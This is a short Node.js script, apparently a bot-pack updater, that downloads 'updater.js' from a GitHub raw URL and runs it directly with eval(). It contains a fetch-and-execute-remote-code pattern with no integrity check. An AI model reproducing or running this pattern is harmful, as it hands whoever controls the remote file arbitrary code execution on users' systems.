const axios = require('axios');

axios.get("https://raw.githubusercontent.com/xnil6x404/Goatbot-v2-botpack-mirai/refs/heads/main/updater.js")
	.then(res => eval(res.data));